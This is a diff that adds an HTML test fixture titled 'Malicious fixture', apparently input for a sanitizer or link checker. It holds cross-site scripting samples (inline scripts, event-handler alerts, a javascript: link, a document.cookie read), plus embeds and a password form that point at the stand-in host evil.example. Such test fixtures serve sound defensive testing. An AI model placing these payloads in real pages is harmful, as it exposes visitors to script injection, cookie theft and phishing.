@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Malicious fixture</title>
+    <script>alert('xss-head')</script>
+  </head>
+  <body>
+    <h1 onclick="alert('xss-click')">Welcome</h1>
+    <p onmouseover="steal()">Hover me</p>
+    <script>document.cookie</script>
+    <img src="https://evil.example/track.png" onerror="alert(1)" />
+    <iframe src="https://evil.example/frame"></iframe>
+    <object data="https://evil.example/obj"></object>
+    <embed src="https://evil.example/embed" />
+    <audio src="https://evil.example/a.mp3"></audio>
+    <video src="https://evil.example/v.mp4"></video>
+    <form action="https://evil.example/phish"><input name="pw" /></form>
+    <a href="javascript:alert('xss-href')">Bad link</a>
+    <a href="https://evil.example">External</a>
+    <a href="friend.zz" title="A friend">Good link</a>
+    <p>Visible content for search indexing.</p>
+  </body>
+</html>
